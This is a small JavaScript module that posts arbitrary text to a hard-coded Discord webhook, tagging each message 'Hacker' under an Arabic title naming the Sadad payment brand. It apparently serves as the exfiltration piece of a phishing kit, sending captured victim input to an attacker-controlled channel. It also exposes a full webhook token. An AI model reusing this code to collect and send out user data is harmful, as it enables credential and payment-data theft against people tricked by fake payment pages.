import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1340006834727293149/NsIAqKi-NU07X0Z5d8qMh5a-Jmv97E7d47HLxGv_VRUbUjMiFn-YVGp6lxlemKze8sE4",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
